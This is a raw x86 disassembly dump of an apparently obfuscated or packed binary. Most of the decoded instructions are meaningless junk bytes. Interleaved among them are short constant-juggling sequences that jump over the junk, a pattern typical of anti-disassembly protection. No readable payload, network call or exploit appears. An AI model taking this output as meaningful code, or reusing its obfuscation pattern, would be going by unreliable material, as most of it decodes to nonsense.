  422417:	fadd   DWORD PTR [ecx+edx*8]
  42241a:	pop    eax
  42241b:	dec    esp
  42241c:	jecxz  0x42244e
  42241e:	inc    ebx
  42241f:	lods   al,BYTE PTR ds:[esi]
  422420:	fs ss ror bl,cl
  422424:	ret    
  422425:	adc    eax,ebp
  422427:	icebp  
  422428:	mov    ch,bh
  42242a:	xchg   esi,eax
  42242b:	std    
  42242c:	aaa    
  42242d:	fisub  WORD PTR [ecx-0x7aba8dc5]
  422433:	cmp    al,0x28
  422435:	jg     0x422415
  422437:	pop    ss
  422438:	pop    edx
  422439:	sti    
  42243a:	lods   eax,DWORD PTR ds:[esi]
  42243b:	sbb    eax,0x3ac61f6a
  422440:	pop    ecx
  422441:	adc    esp,DWORD PTR [esp+ecx*2-0x5663c248]
  422448:	retf   0xbbd8
  42244b:	repnz xchg esp,eax
  42244d:	jne    0xda9a543b
  422453:	inc    edi
  422454:	mov    ebx,0xd3e3bc76
  422459:	or     al,0x6d
  42245b:	test   BYTE PTR [edx-0x4d],bl
  42245e:	pop    ebx
  42245f:	retf   0xf88
  422462:	push   edx
  422463:	mov    ah,0x90
  422465:	cmp    DWORD PTR [eax+0x403b5f0c],0x6f4ebe65
  42246f:	or     al,BYTE PTR ds:0xefa42792
  422475:	mov    WORD PTR [edi],ss
  422477:	add    al,0x96
  422479:	stos   BYTE PTR es:[edi],al
  42247a:	mov    edi,0xb8191e7a
  42247f:	jl     0x422479
  422481:	sbb    al,0x6c
  422483:	mov    ecx,0x852bfd51
  422488:	mov    cl,0x20
  42248a:	adc    dh,bl
  42248c:	push   ebp
  42248d:	int3   
  42248e:	xor    bl,BYTE PTR [edi+0x30c4a79b]
  422494:	and    eax,0x9ae361a1
  422499:	dec    ebp
  42249a:	popf   
  42249b:	jmp    0x7c75e498
  4224a0:	test   al,0x6d
  4224a2:	adc    edi,edi
  4224a4:	xchg   ecx,eax
  4224a5:	not    BYTE PTR ds:[eax+0x34e0568]
  4224ac:	cs call 0x1213:0x5d95ccc9
  4224b4:	mov    edx,DWORD PTR [ebp-0x8]
  4224b7:	or     eax,0x601
  4224bc:	jmp    0x42258a
  4224c1:	dec    edx
  4224c2:	daa    
  4224c3:	pop    esp
  4224c4:	aam    0x7d
  4224c6:	dec    edx
  4224c8:	mov    edi,0xa1a9af5e
  4224cd:	iret   
  4224ce:	mov    ecx,DWORD PTR [ecx+0x1921d8f]
  4224d4:	add    BYTE PTR [ecx-0x5b000000],dh
  4224da:	mov    ch,0xb1
  4224dc:	in     eax,dx
  4224dd:	mov    ah,0x34
  4224df:	mov    DWORD PTR [edx],ebp
  4224e1:	dec    edi
  4224e2:	cmp    DWORD PTR [ebp-0x39f7c878],ebp
  4224e8:	lods   al,BYTE PTR ds:[esi]
  4224e9:	or     eax,0x8acb2446
  4224ee:	dec    ebp
  4224ef:	jmp    0xc0756f1c
  4224f4:	mov    ecx,0x1befb1a9
  4224f9:	inc    edx
  4224fa:	pop    ecx
  4224fb:	aaa    
  4224fc:	fild   DWORD PTR [eax]
  4224fe:	mov    bl,0xf8
  422500:	cmp    ebp,edi
  422502:	hlt    
  422503:	call   0x2bdf:0x8bcf6d96
  42250a:	xchg   ecx,eax
  42250b:	add    eax,0xc6d4b2bf
  422510:	mov    ch,BYTE PTR [eax]
  422512:	neg    cl
  422514:	xchg   esi,eax
  422515:	push   edx
  422516:	pop    ss
  422517:	lock cmp edx,ecx
  42251a:	and    edx,0x80b23658
  422520:	loop   0x4224ea
  422522:	or     eax,0x99dd86ca
  422527:	addr16 call 0xfa60e0fe
  42252d:	(bad)  
  42252e:	or     BYTE PTR [ecx+0x4ce91d21],al
  422534:	ds xchg edi,eax
  422536:	sar    BYTE PTR [eax-0x3d],1
  422539:	dec    esp
  42253a:	(bad)  
  42253c:	mov    al,ds:0xac35abef
  422541:	ja     0x42250e
  422543:	mov    es:0x492b503a,al
  422549:	xor    al,ch
  42254b:	and    cl,ch
  42254d:	add    cl,BYTE PTR [edx]
  42254f:	fst    QWORD PTR [ebx-0x1ca1a464]
  422555:	jno    0x422584
  422557:	pop    ds
  422558:	and    BYTE PTR [esi],ch
  42255a:	sbb    al,0xa0
  42255c:	mov    eax,0xd2ced791
  422561:	sub    ah,BYTE PTR [esi]
  422563:	sbb    esi,DWORD PTR [ecx+0x3e182d60]
  422569:	popa   
  42256a:	nop
  42256b:	jecxz  0x4225b5
  42256d:	mov    bh,0x3c
  42256f:	or     bl,dl
  422571:	mov    ecx,0x6cf1397d
  422576:	fld    QWORD PTR [ebx+ebx*2]
  422579:	xor    esi,DWORD PTR [esi]
  42257b:	inc    esp
  42257c:	jnp    0x422546
  42257e:	repz sbb DWORD PTR [edi+0x49],edx
  422582:	mov    ch,0x6e
  422584:	add    DWORD PTR [edi+0x2901f371],edi
  42258a:	xor    eax,0xffffe0ef
  42258f:	jmp    0x42265d
  422594:	enter  0x1182,0xc5
  422598:	pop    ebx
  422599:	xlat   BYTE PTR ds:[ebx]
  42259a:	fmul   QWORD PTR [edi+0x335cb77d]
  4225a0:	jl     0x422554
  4225a2:	mov    BYTE PTR [ecx],bh
  4225a4:	into   
  4225a5:	xchg   edx,eax
  4225a6:	add    DWORD PTR [eax],eax
  4225a8:	mov    cl,0x0
  4225aa:	add    BYTE PTR [eax],al
  4225ac:	ins    BYTE PTR es:[edi],dx
  4225ad:	lods   eax,DWORD PTR ds:[esi]
  4225ae:	xchg   BYTE PTR [ecx],cl
  4225b0:	mov    BYTE PTR gs:[edx-0x77e1734d],ah
  4225b7:	cli    
  4225b8:	push   ecx
  4225b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4225ba:	jb     0x4225f8
  4225bc:	push   ds
  4225bd:	loop   0x42258a
  4225bf:	sub    eax,0x58e95ef6
  4225c4:	or     BYTE PTR [edi-0x78],ah
  4225c7:	adc    eax,0xbffa7dd0
  4225cc:	jno    0x4225ee
  4225ce:	test   al,0xd6
  4225d0:	mov    ds:0x84ef68c1,al
  4225d5:	out    dx,eax
  4225d6:	jge    0x4225c1
  4225d8:	pushf  
  4225d9:	loope  0x422612
  4225db:	pop    ecx
  4225dc:	inc    esi
  4225dd:	pop    ss
  4225de:	or     DWORD PTR [eax],ebx
  4225e0:	xor    eax,0x1ccbb119
  4225e5:	and    DWORD PTR [ebx+0x42f71097],esi
  4225eb:	cmp    al,BYTE PTR [ebx]
  4225ed:	mov    WORD PTR [edi-0x1a],cs
  4225f0:	cmc    
  4225f1:	inc    esp
  4225f2:	inc    esp
  4225f3:	xlat   BYTE PTR ds:[ebx]
  4225f4:	add    al,0xc6
  4225f6:	and    esp,DWORD PTR [edx]
  4225f8:	xchg   esi,eax
  4225f9:	push   esi
  4225fa:	push   esi
  4225fb:	or     DWORD PTR [edx-0x45f19ad6],esp
  422601:	add    al,0xbd
  422603:	jmp    0x2a9f:0x467454f3
  42260a:	mov    eax,ds:0x80ca2e46
  42260f:	retf   0x3d
  422612:	xor    BYTE PTR [ecx],cl
  422614:	cmp    DWORD PTR [ebp+0x8d614af],ecx
  42261a:	jnp    0x4225f9
  42261c:	sbb    DWORD PTR [ebx],edx
  42261e:	shl    DWORD PTR [eax],cl
  422620:	aad    0xae
  422622:	push   cs
  422623:	ja     0x422626
  422625:	fbstp  TBYTE PTR [ebx+0x438ee68]
  42262b:	jno    0x4225eb
  42262d:	xchg   BYTE PTR [ecx-0x72],bl
  422630:	xor    cl,BYTE PTR [ecx-0x7c]
  422633:	ret    
  422634:	xchg   BYTE PTR [esi+0x74],dl
  422637:	clc    
  422638:	dec    ebp
  422639:	mov    bh,0xd5
  42263b:	sub    DWORD PTR [ecx+0x25c933c4],0xffffffcc
  422642:	xchg   edx,eax
  422643:	sti    
  422644:	not    DWORD PTR [ebp-0x60]
  422647:	mov    ds:0x24b2770f,eax
  42264c:	std    
  42264d:	or     eax,0x5d4b0731
  422652:	sub    eax,ecx
  422654:	ficomp DWORD PTR [edi+0x3d]
  422657:	cmp    al,0x61
  422659:	xchg   ebx,eax
  42265a:	std    
  42265b:	mov    bh,0x66
  42265d:	and    eax,edx
  42265f:	and    eax,0x5f19
  422664:	mov    DWORD PTR [ebp-0xc],eax
  422667:	mov    DWORD PTR [ebp-0x8],ebx
  42266a:	mov    DWORD PTR [ebp-0x24],0x47ff
  422671:	mov    eax,DWORD PTR [ebp-0x24]
  422674:	mov    ebx,DWORD PTR [ebp-0x8]
  422677:	jmp    0x422745
  42267c:	mov    bl,0xbf
  42267e:	xor    BYTE PTR [esp+edi*1],ah
  422681:	scas   eax,DWORD PTR es:[edi]
  422682:	mov    bh,0xbf
  422684:	rcr    BYTE PTR [ebp-0x60f8985b],cl
  42268a:	mov    ch,0xde
  42268c:	jg     0x422621
  42268e:	add    DWORD PTR [eax],eax
  422690:	mov    cl,0x0
  422692:	add    BYTE PTR [eax],al
  422694:	push   esi
  422695:	ins    BYTE PTR es:[edi],dx
  422696:	stc    
  422697:	push   ebx
  422698:	cmp    esi,DWORD PTR [edi+0x48]
  42269b:	addr16 imul ebx,esi,0xffffff9c
  42269f:	mov    ecx,0x9bd132c5
  4226a4:	xchg   ebp,eax
  4226a5:	loope  0x4226df
  4226a7:	ret    0x5b2a
  4226aa:	jbe    0x42266b
  4226ac:	xor    al,0x8d
  4226ae:	push   cs
  4226af:	or     eax,ebp
  4226b1:	stos   BYTE PTR es:[edi],al
  4226b2:	retf   0xfdf0
  4226b5:	pop    ecx
  4226b6:	fidivr WORD PTR [edi+0xc736918]
  4226bc:	push   es
  4226bd:	lds    eax,FWORD PTR [esi-0x2d41bfb9]
  4226c3:	inc    edx
  4226c4:	fnstcw WORD PTR [edx+0x2d]
  4226c7:	daa    
  4226c8:	sub    esi,edi
  4226ca:	jnp    0x42268f
  4226cc:	mov    ebx,0x9ded8d9d
  4226d1:	xor    DWORD PTR [esi+esi*8+0x70366a65],esp
  4226d8:	loopne 0x42272c
  4226da:	dec    edi
  4226db:	and    ecx,esi
  4226dd:	rol    dl,1
  4226df:	div    BYTE PTR [ebx-0x2f23a165]
  4226e5:	ss pop ecx
  4226e7:	sub    edi,0xaa573314
  4226ed:	shl    DWORD PTR ds:0xcac04905,cl
  4226f3:	mov    ds:0x445a29c2,al
  4226f8:	and    al,0x66
  4226fa:	sbb    al,0x1b
  4226fc:	pop    esp
  4226fd:	inc    esp
  4226fe:	xchg   BYTE PTR [eax+0x74739e59],bl
  422704:	jnp    0x42274b
  422706:	ret    0x5f80
  422709:	dec    BYTE PTR [edi+0x37]
  42270c:	fwait
  42270d:	or     bl,BYTE PTR [eax]
  42270f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422710:	mov    edi,0xadc7ac56
  422715:	test   al,0x10
  422717:	inc    ecx
  422718:	push   0x7fbbed72
  42271d:	inc    ecx
  42271e:	test   eax,0x4be77efd
  422723:	sbb    eax,0x4f42730
  422728:	in     eax,dx
  422729:	push   0xc5833342
  42272e:	push   ebp
  42272f:	in     eax,dx
  422730:	mov    edi,0x41ecae3d
  422735:	jg     0x42278f
  422737:	and    bl,bl
  422739:	(bad)  
  42273a:	cmp    BYTE PTR [edx+edx*8],bh
  42273d:	cdq    
  42273e:	mov    DWORD PTR [edx+0xbb4827c],eax
  422744:	(bad)  
  422745:	and    eax,edi
  422747:	jmp    0x422815
  42274c:	icebp  
  42274d:	push   ds
  42274e:	ret    0xefa6
  422751:	(bad)  
  422752:	cmc    
  422753:	pop    edi
  422754:	xchg   ecx,eax
  422755:	mov    ds:0xeca4c3db,eax
  42275a:	retf   0x30cd
  42275d:	xchg   esp,eax
  42275e:	add    DWORD PTR [eax],eax
  422760:	mov    cl,0x0
  422762:	add    BYTE PTR [eax],al
  422764:	inc    ecx
  422765:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422766:	sbb    eax,0x9dc6406f
  42276b:	inc    esp
  42276c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42276d:	addr16 dec ecx
  42276f:	mov    BYTE PTR [eax],ah
  422771:	imul   DWORD PTR [edx]
  422773:	(bad)  [edi+0x355c20f6]
  422779:	ret    
  42277a:	adc    BYTE PTR [edi+0x2b9337e5],bh
  422780:	movlps xmm0,QWORD PTR [ebp-0x13ea4f1]
  422787:	xor    dl,BYTE PTR [edi]
  422789:	mov    BYTE PTR [edi+0x411e30f3],bh
  42278f:	sbb    ecx,DWORD PTR [ebp-0x727132c]
  422795:	outs   dx,BYTE PTR ds:[esi]
  422796:	push   edx
  422797:	imul   BYTE PTR [ecx+edi*8+0x14]
  42279b:	aaa    
  42279c:	dec    ecx
  42279d:	xor    eax,0x4681b689
  4227a2:	lods   al,BYTE PTR ds:[esi]
  4227a3:	and    ebp,esi
  4227a5:	fist   WORD PTR [ebp-0x4c1b6b27]
  4227ab:	es in  eax,0x1b
  4227ae:	test   al,0xb3
  4227b0:	mov    ch,0x0
  4227b2:	jmp    0x422798
  4227b4:	adc    ebp,DWORD PTR [ebp-0xa]
  4227b7:	fiadd  WORD PTR [esp+eax*8-0x36]
  4227bb:	adc    al,0xd2
  4227bd:	or     DWORD PTR [esi],0xffffff91
  4227c0:	push   0x32
  4227c2:	xor    dh,BYTE PTR [ecx]
  4227c4:	nop
  4227c5:	imul   edi,DWORD PTR [esi],0x69474587
  4227cb:	(bad)  
  4227cc:	aam    0xe7
  4227ce:	test   eax,0x8080a227
  4227d3:	popf   
  4227d4:	pop    ebp
  4227d5:	mov    ebx,0xbd43d817
  4227da:	dec    BYTE PTR [eax-0x36]
  4227dd:	dec    esp
  4227de:	repnz and bh,BYTE PTR [ecx+0x1f]
  4227e2:	inc    BYTE PTR [ecx+0x32f3da71]
  4227e8:	jne    0x422777
  4227ea:	push   ecx
  4227eb:	pop    edx
  4227ec:	sub    cl,BYTE PTR [ebx]
  4227ee:	pop    es
  4227ef:	mov    ds:0xe4c7e871,eax
  4227f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4227f5:	int    0x3f
  4227f7:	cs dec edx
  4227f9:	sbb    al,ah
  4227fb:	mov    DWORD PTR [edi+0x7e],eax
  4227fe:	fsubr  QWORD PTR ds:0x659b32bc
  422804:	mov    ebp,edi
  422806:	mov    WORD PTR [eax+0x12d43a68],cs
  42280c:	dec    ebp
  42280d:	dec    edi
  42280e:	ss test esp,esi
  422811:	scas   eax,DWORD PTR es:[edi]
  422812:	test   al,0x27
  422814:	add    BYTE PTR [ebx],dh
  422816:	shl    BYTE PTR [ebx],cl
  422818:	shl    edi,0xf3
  42281b:	mov    edx,DWORD PTR [ebp-0xc]
  42281e:	cmp    eax,edx
  422820:	jae    0x423513
  422826:	mov    DWORD PTR [ebp-0x14],0x4de2
  42282d:	mov    DWORD PTR [ebp-0x18],0x3726
  422834:	jmp    0x422902
  422839:	mov    ebp,0xefe7c953
  42283e:	(bad)  
  42283f:	mov    edi,0x5b06a15b
  422844:	dec    esi
  422845:	push   ss
  422846:	push   edi
  422847:	sub    al,0xbc
  422849:	loope  0x4227df
  42284b:	add    DWORD PTR [eax],eax
  42284d:	mov    cl,0x0
  42284f:	add    BYTE PTR [eax],al
  422851:	mov    ch,0x6
  422853:	adc    eax,0xd60e8eb2
  422858:	sbb    al,0xfd
  42285a:	inc    esp
  42285b:	sub    al,0xd9
  42285d:	xchg   DWORD PTR [ecx+0x6f],esi
  422860:	hlt    
  422861:	outs   dx,DWORD PTR ds:[esi]
  422862:	hlt    
  422863:	sar    BYTE PTR [esi+0x15],0xe2
  422867:	inc    BYTE PTR [edi-0x1b398cc5]
  42286d:	fwait
  42286e:	jns    0x42285d
  422870:	retf   0x4f48
  422873:	ds jns 0x4228db
  422876:	fwait
  422877:	pop    edx
  422878:	xor    esi,eax
  42287a:	inc    edi
  42287b:	test   eax,0xe0ba2a75
  422880:	icebp  
  422881:	(bad)  
  422882:	push   edi
  422883:	sar    BYTE PTR [esi],cl
  422885:	cmp    ebx,DWORD PTR [esi+0x64]
  422888:	sub    ebx,DWORD PTR ds:0xeab1068e
  42288e:	add    ebx,DWORD PTR [ebx]
  422890:	ja     0x422831
  422892:	fdiv   QWORD PTR [edi-0x3f]
  422895:	sbb    ah,BYTE PTR [esi+0x51ba6475]
  42289b:	mov    esp,0x10b256b6
  4228a0:	jns    0x422894
  4228a2:	push   es
  4228a3:	pop    es
  4228a4:	pop    eax
  4228a5:	and    al,0x25
  4228a7:	retf   0xe7d1
  4228aa:	inc    eax
  4228ab:	inc    edi
  4228ac:	xchg   edx,eax
  4228ad:	loopne 0x422872
  4228af:	loop   0x422832
  4228b1:	or     ecx,DWORD PTR [edx]
  4228b3:	jb     0x42291b
  4228b5:	push   eax
  4228b6:	pusha  
  4228b7:	xor    DWORD PTR [ecx*8+0x1313b620],ebx
  4228be:	(bad)  
  4228bf:	dec    eax
  4228c0:	inc    ebp
  4228c1:	sub    bh,al
  4228c3:	aaa    
  4228c4:	pop    es
  4228c5:	addr16 ja 0x4228ec
  4228c8:	hlt    
  4228c9:	jb     0x422929
  4228cb:	ret    0x97ea
  4228ce:	or     BYTE PTR [ebx-0x6e46dd96],al
  4228d4:	leave  
  4228d5:	inc    ebp
  4228d6:	mov    ch,0xee
  4228d8:	push   esi
  4228d9:	sahf   
  4228da:	sahf   
  4228db:	jmp    0x6433:0x1f131149
  4228e2:	adc    ebp,DWORD PTR [eax]
  4228e4:	and    al,0x13
  4228e6:	mov    edi,0x335cd197
  4228eb:	jg     0x4228e6
  4228ed:	shr    DWORD PTR [edi],cl
  4228ef:	mov    cl,0xe7
  4228f1:	jle    0x422919
  4228f3:	xor    al,0x17
  4228f5:	jmp    DWORD PTR [edx]
  4228f7:	iret   
  4228f8:	mov    dh,0x8
  4228fa:	push   ss
  4228fb:	ins    BYTE PTR es:[edi],dx
  4228fc:	inc    edi
  4228fd:	std    
  4228fe:	add    al,0x76
  422900:	pop    edx
  422901:	dec    edi
  422902:	mov    DWORD PTR [ebp-0xc],0x2e39
  422909:	mov    DWORD PTR [ebp-0x8],0x7c06
  422910:	mov    DWORD PTR [ebp-0x24],0x6909
  422917:	jmp    0x4229e5
  42291c:	fsubr  st,st(4)
  42291e:	fwait
  42291f:	mov    eax,0xecfbffbf
  422924:	cmp    cl,BYTE PTR [eax]
  422926:	lahf   
  422927:	(bad)  
  422928:	int3   
  422929:	adc    BYTE PTR [esi+0x19592c3],bh
  42292f:	add    BYTE PTR [ecx-0x7a000000],dh
  422935:	popf   
  422936:	push   edx
  422937:	(bad)
  42293a:	sub    BYTE PTR [eax+0x9983c9c],0x60
  422941:	sub    DWORD PTR [ebp+0x33],eax
  422944:	or     ebx,edi
  422946:	sti    
  422947:	xor    eax,0x5c4268a8
  42294c:	add    esi,DWORD PTR [eax+0x10b89f10]
  422952:	dec    esp
  422953:	sub    dl,BYTE PTR [edx-0x1fcf1fe0]
  422959:	inc    esp
  42295a:	push   cs
  42295b:	add    eax,0x836c9d91
  422960:	icebp  
  422961:	stc    
  422962:	inc    edx
  422963:	(bad)  [esi-0x35]
  422966:	push   cs
  422967:	and    BYTE PTR [ebx+0x7d1da128],ah
  42296d:	dec    ebx
  42296e:	fcomip st,st(7)
  422970:	xor    DWORD PTR [edx+0x5a],eax
  422973:	pop    DWORD PTR [edx+ecx*4]
  422976:	pop    ss
  422977:	inc    eax
  422978:	mov    dh,0x31
  42297a:	xor    esi,esp
  42297c:	xchg   ebp,eax
  42297d:	sub    esp,edi
  42297f:	dec    ebp
  422980:	pop    esp
  422981:	or     al,0x38
  422983:	add    eax,0xa68c66f5
  422988:	pxor   mm6,mm2
  42298b:	pop    eax
  42298c:	mov    ds:0x5d815589,eax
  422991:	ds add eax,0xe4d3b975
  422997:	pop    ecx
  422998:	or     DWORD PTR [ebp+eiz*2-0x51707585],esp
  42299f:	aas    
  4229a0:	and    al,0x8
  4229a2:	pop    ebx
  4229a3:	add    ch,al
  4229a5:	jno    0x422a0b
  4229a7:	aaa    
  4229a8:	inc    ebp
  4229a9:	sub    bl,dl
  4229ab:	bound  ebp,QWORD PTR [edx+eiz*4-0x31]
  4229af:	inc    ecx
  4229b0:	lds    esi,FWORD PTR [edx-0x25]
  4229b3:	in     eax,dx
  4229b4:	mov    edi,0x567ec0bb
  4229b9:	dec    edi
  4229ba:	push   ss
  4229bb:	push   esp
  4229bc:	sub    BYTE PTR [ecx+0x5],bl
  4229bf:	add    BYTE PTR [eax-0x57],dh
  4229c2:	dec    eax
  4229c3:	scas   al,BYTE PTR es:[edi]
  4229c4:	xchg   ebp,eax
  4229c5:	mov    eax,0x60f1477f
  4229ca:	push   ds
  4229cb:	pusha  
  4229cc:	je     0x4229ab
  4229ce:	sti    
  4229cf:	add    esp,DWORD PTR [esi-0xf0e13c1]
  4229d5:	cwde   
  4229d6:	pop    ecx
  4229d7:	mov    dl,0x7b
  4229d9:	out    dx,eax
  4229da:	dec    ecx
  4229db:	and    ebp,ecx
  4229dd:	fs ss stos DWORD PTR es:[edi],eax
  4229e0:	and    edx,DWORD PTR [edx+0x5f]
  4229e3:	adc    eax,0xdc458b3c
  4229e8:	mov    edx,DWORD PTR [ebp-0x8]
  4229eb:	sub    edx,eax
  4229ed:	mov    eax,DWORD PTR [ebp-0xc]
  4229f0:	xor    edx,eax
  4229f2:	mov    eax,DWORD PTR [ebp-0x18]
  4229f5:	sub    edx,0x2897
  4229fb:	jmp    0x422ac9
  422a00:	pop    ecx
  422a01:	lods   eax,DWORD PTR ds:[esi]
  422a02:	fidiv  WORD PTR [ebx]
  422a04:	(bad)  
  422a05:	jae    0x422a04
  422a07:	out    dx,eax
  422a08:	pop    edi
  422a09:	sbb    al,0x3c
  422a0b:	or     eax,0xdeb12d75
  422a10:	inc    ebx
  422a11:	xchg   esi,eax
  422a12:	add    DWORD PTR [eax],eax
  422a14:	mov    cl,0x0
  422a16:	add    BYTE PTR [eax],al
  422a18:	pop    ecx
  422a19:	jae    0x422a34
  422a1b:	ret    0x575c
  422a1e:	dec    ecx
  422a1f:	mov    cl,dh
  422a21:	iret   
  422a22:	inc    eax
  422a23:	cwde   
  422a24:	fbld   TBYTE PTR [esi+0x73]
  422a27:	ficom  DWORD PTR [edi+0xcba214e]
  422a2d:	loop   0x422a08
  422a2f:	outs   dx,BYTE PTR ds:[esi]
  422a30:	push   esi
  422a31:	or     al,0xdd
  422a33:	xchg   esi,eax
  422a34:	iret   
  422a35:	xchg   ebx,eax
  422a36:	outs   dx,DWORD PTR ds:[esi]
  422a37:	fs dec ebx
  422a39:	sub    bh,BYTE PTR [ebp+0x29]
  422a3c:	cwde   
  422a3d:	mov    ecx,DWORD PTR [edi]
  422a3f:	aas    
  422a40:	mov    cl,0x62
  422a42:	mov    bh,0x90
  422a44:	ret    
  422a45:	pop    eax
  422a46:	mov    ds:0xc0a1b459,al
  422a4b:	dec    ebp
  422a4c:	(bad)  
  422a4d:	pusha  
  422a4e:	rcl    BYTE PTR [edx+ebx*8+0x34],cl
  422a52:	jp     0x422a9f
  422a54:	mov    ebx,DWORD PTR [ecx]
  422a56:	or     bl,BYTE PTR [eax-0x2d]
  422a59:	ds ret 
  422a5b:	fcmovnu st,st(4)
  422a5d:	pop    edi
  422a5e:	sbb    al,BYTE PTR [edi+esi*4-0x538d6ef7]
  422a65:	add    eax,0x4ed83798
  422a6a:	lods   al,BYTE PTR ds:[esi]
  422a6b:	out    dx,eax
  422a6c:	xlat   BYTE PTR ds:[ebx]
  422a6d:	repnz inc edx
  422a6f:	or     al,0x51
  422a71:	pop    esi
  422a72:	ss sti 
  422a74:	xchg   edx,eax
  422a75:	ja     0x422acb
  422a77:	rcr    DWORD PTR [eax-0xd],1
  422a7a:	push   es
  422a7b:	cmp    edi,DWORD PTR [edx-0x3ce59ebc]
  422a81:	rcr    DWORD PTR [eax-0x60],cl
  422a84:	retf   0x36b2
  422a87:	sub    ecx,DWORD PTR [edx]
  422a89:	mov    eax,0xd58dbea6
  422a8e:	inc    ecx
  422a8f:	sbb    cl,BYTE PTR [ecx-0x27]
  422a92:	test   ah,0xb5
  422a95:	(bad)  
  422a96:	mov    eax,0x151f09c0
  422a9b:	nop
  422a9c:	or     al,0xcc
  422a9e:	jnp    0x422a44
  422aa0:	in     eax,dx
  422aa1:	fmul   st(2),st
  422aa3:	jge    0x422a3c
  422aa5:	xchg   esp,eax
  422aa6:	mov    ch,BYTE PTR [edx]
  422aa8:	mov    cl,0x1b
  422aaa:	and    edi,DWORD PTR [edx]
  422aac:	inc    ebx
  422aad:	loopne 0x422b17
  422aaf:	fdivr  DWORD PTR ds:0xa43ab771
  422ab5:	hlt    
  422ab6:	fcom   QWORD PTR [edx]
  422ab8:	cs jnp 0x422a3b
  422abb:	dec    ebx
  422abc:	xchg   ebx,edi
  422abe:	fmul   st,st(0)
  422ac0:	fstp   st(2)
  422ac2:	lds    edx,FWORD PTR [ebx-0x163afb61]
  422ac8:	dec    esi
  422ac9:	imul   edx,eax
  422acc:	jmp    0x422b9a
  422ad1:	loope  0x422b27
  422ad3:	fwait
  422ad4:	pop    ecx
  422ad5:	mov    edi,0x77fce3df
  422ada:	out    0xf8,al
  422adc:	sbb    al,0xe5
  422ade:	fisub  DWORD PTR [ebx]
  422ae0:	aas    
  422ae1:	hlt    
  422ae2:	xchg   esi,eax
  422ae3:	add    DWORD PTR [eax],eax
  422ae5:	mov    cl,0x0
  422ae7:	add    BYTE PTR [eax],al
  422ae9:	lahf   
  422aea:	aaa    
  422aeb:	shl    bh,0xe6
  422aee:	jns    0x422b0d
  422af0:	add    DWORD PTR [ebp+0x4c],0xf499dbc8
  422af7:	ins    DWORD PTR es:[edi],dx
  422af8:	xchg   esi,eax
  422af9:	lahf   
  422afa:	push   esp
  422afb:	imul   eax,DWORD PTR [ecx+0x4d],0x41
  422aff:	stos   BYTE PTR es:[edi],al
  422b00:	cmp    eax,DWORD PTR fs:[esp+edi*4]
  422b04:	and    ecx,DWORD PTR [ecx]
  422b06:	lods   eax,DWORD PTR ds:[esi]
  422b08:	hlt    
  422b09:	out    dx,eax
  422b0a:	and    ecx,ecx
  422b0c:	jo     0x422b0f
  422b0e:	mov    ds:0xf2820042,al
  422b13:	add    edi,DWORD PTR [eax+0x1c4ae37c]
  422b19:	jmp    0xd6dad6d3
  422b1e:	sub    esi,DWORD PTR [eax+edi*2-0x4]
  422b22:	es mov edx,0x3d9e7824
  422b28:	dec    esp
  422b29:	and    eax,0xd363393a
  422b2e:	(bad)  
  422b2f:	aad    0xdb
  422b31:	inc    eax
  422b32:	and    eax,0x36210868
  422b37:	push   eax
  422b38:	xchg   ecx,eax
  422b39:	jae    0x422b55
  422b3b:	sub    eax,esp
  422b3d:	cmp    ebx,DWORD PTR [eax-0x6f]
  422b40:	pop    edi
  422b41:	stc    
  422b42:	pop    ds
  422b43:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422b44:	mov    esi,0xaf0659fc
  422b49:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422b4a:	aas    
  422b4b:	mov    ebp,DWORD PTR [ecx+0x2a07624a]
  422b51:	out    dx,eax
  422b52:	stos   DWORD PTR es:[edi],eax
  422b53:	mov    cl,0x61
  422b55:	dec    edx
  422b56:	jl     0x422baa
  422b58:	jmp    0xafad:0x67122b06
  422b5f:	dec    edx
  422b60:	ror    DWORD PTR [edx+0x4dba75de],1
  422b66:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422b67:	test   DWORD PTR [esi+0x77],0x94a52bc2
  422b6e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422b6f:	sub    ebp,0xfffffff0
  422b72:	out    dx,al
  422b73:	xor    al,0x5b
  422b75:	ins    BYTE PTR es:[edi],dx
  422b76:	mov    dl,0x41
  422b78:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422b79:	mov    edi,0xe9cc414c
  422b7e:	push   ecx
  422b7f:	inc    ebx
  422b80:	mul    ebp
  422b82:	js     0x422b1c
  422b84:	lahf   
  422b85:	call   0x993a:0x54fed5b5
  422b8c:	fmulp  st(2),st
  422b8e:	push   ss
  422b8f:	inc    ebx
  422b90:	mov    esi,DWORD PTR [ebx+0x5]
  422b93:	and    eax,0xd75b6394
  422b98:	aad    0xd4
  422b9a:	mov    eax,DWORD PTR [ebp-0x14]
  422b9d:	and    edx,eax
  422b9f:	mov    DWORD PTR [ebp-0x24],edx
  422ba2:	mov    DWORD PTR [ebp-0x8],0x3b78
  422ba9:	jmp    0x422c77
  422bae:	daa    
  422baf:	pop    eax
  422bb0:	push   0x377c7f5c
  422bb5:	jnp    0x422c1d
  422bb7:	imul   ebp,DWORD PTR [ebp+0xc2673c7],0x197a55f
  422bc1:	add    BYTE PTR [ecx+0xf000000],dh
  422bc7:	das    
  422bc8:	xor    eax,0xcfe659d0
  422bcd:	das    
  422bce:	mov    al,ds:0x5f008bc3
  422bd3:	lds    edi,FWORD PTR [ebp+0x58a80a42]
  422bd9:	ds jne 0x422c55
  422bdc:	aad    0x93
  422bde:	inc    eax
  422bdf:	xor    BYTE PTR [ecx+0x3785805c],ah
  422be5:	push   cs
  422be6:	imul   ecx,DWORD PTR [edi-0x15],0xee23e543
  422bed:	ja     0x422bd5
  422bef:	sbb    eax,0x12a32fc1
  422bf4:	cdq    
  422bf5:	mov    ebp,0xabf31545
  422bfa:	push   ebx
  422bfb:	mov    WORD PTR [ecx],?
  422bfd:	lods   al,BYTE PTR ds:[esi]
  422bfe:	test   cl,dh
  422c00:	call   0x912b5336
  422c05:	push   eax
  422c06:	mov    esp,0x75bc6c59
  422c0b:	(bad)  
  422c0c:	pusha  
  422c0d:	adc    DWORD PTR ds:0x6d330e1b,esi
  422c13:	stos   DWORD PTR es:[edi],eax
  422c14:	out    0x97,eax
